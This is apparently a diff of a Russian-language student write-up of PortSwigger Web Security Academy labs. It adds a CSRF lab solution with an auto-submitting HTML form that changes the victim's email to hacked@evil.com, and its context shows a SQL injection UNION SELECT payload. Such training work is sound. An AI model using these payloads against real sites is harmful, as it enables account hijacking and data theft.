@@ -80,7 +80,7 @@
 
 ## Лабораторная работа 3: SQL injection UNION attack, determining the number of columns returned by the query
 
-**Ссылка:** [Ссылка на лабу](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass#)
+**Ссылка:** [Ссылка на лабу](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-determining-the-number-of-columns-required/sql-injection/union-attacks/lab-determine-number-of-columns#)
 
 ### Описание уязвимости
 В фильтре категорий товаров обнаружена уязвимость SQL-инъекции. Результаты SQL-запроса напрямую отражаются в ответе приложения. Для дальнейшей эксплуатации (кражи данных из других таблиц) необходимо использовать оператор `UNION`. Однако для успешной UNION-атаки критически важно знать точное количество столбцов, возвращаемых оригинальным запросом.
@@ -127,6 +127,70 @@ GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
 ![Скриншот успешный UNION SELECT](../img/2026-11-06_15-10.png)
 
 ![Скриншот страница задания PortSwigger с записью Solved](../img/2026-11-06_15-13.png)
+
+---
+
+## Лабораторная работа 4: CSRF vulnerability with no defenses
+
+**Ссылка:** [Ссылка на лабу](https://portswigger.net/web-security/learning-paths/csrf/csrf-how-to-construct-a-csrf-attack/csrf/lab-no-defenses#)
+
+### Описание уязвимости
+Функционал смены email в личном кабинете уязвим к атаке **CSRF (Cross-Site Request Forgery)**. Приложение не использует никаких защитных механизмов (таких как CSRF-токены или проверка заголовка `Referer`), полагаясь исключительно на сессионные cookie. Злоумышленник может заставить браузер жертвы отправить POST-запрос на смену email без её ведома.
+
+### Ход выполнения
+
+### Шаг 1. Анализ запроса
+При авторизации под учетной записью `wiener:peter` и попытке смены email, с помощью Burp Suite был перехвачен следующий запрос:
+
+```http
+POST /my-account/change-email HTTP/1.1
+Host: 0a6b00ea03585be6808e12ed007d005b.web-security-academy.net
+Cookie: session=...
+Content-Type: application/x-www-form-urlencoded
+
+email=test%40test.com
+```
+Запрос уязвим, так как содержит только параметр `email` и не требует подтверждения действий пользователя.
+
+### Шаг 2. Создание вредоносной HTML-страницы (PoC)
+Поскольку в запросе нет проверки токена, мы можем сформировать HTML-форму, которая автоматически отправит POST-запрос при загрузке страницы. Код эксплойта:
+```html
+
+ <html>
+  <body>
+    <form action="https://0a6b00ea03585be6808e12ed007d005b.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacked@evil.com" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+```
+
+
+### Шаг 3. Доставка эксплойта
+1. Код был размещен на сервере атакующего (встроенный "Exploit Server" в лаборатории) в разделе "Body" и сохранен ("Store").
+2. С помощью кнопки "View exploit" была проверена работоспособность скрипта (email успешно изменился).
+3. Кнопкой "Deliver to victim" эксплойт был отправлен жертве.
+
+### Результат
+При переходе жертвы на вредоносную страницу, её браузер автоматически отправил POST-запрос на смену email, используя её активную сессию. 
+Email жертвы был изменен, и лабораторная работа была засчитана как решенная **Solved**.
+
+### Доказательство:
+
+![Скриншот из замены email на test@tast.com](../img/2026-11-06_17-10.png)
+![Скриншот из Burp Suite перехвата POST замены email test@tast.com](../img/2026-11-06_17-11.png)
+
+![Скриншот создания exploit](../img/2026-11-06_17-23.png)
+
+![Скриншот применения exploit](../img/2026-11-06_17-25.png)
+
+![Скриншот подтверждения удачного применеия exploit](../img/2026-11-06_17-28.png)
+
+![Скриншот 2 подтверждения удачного применеия exploit](../img/2026-11-06_17-29.png)
 
 
 
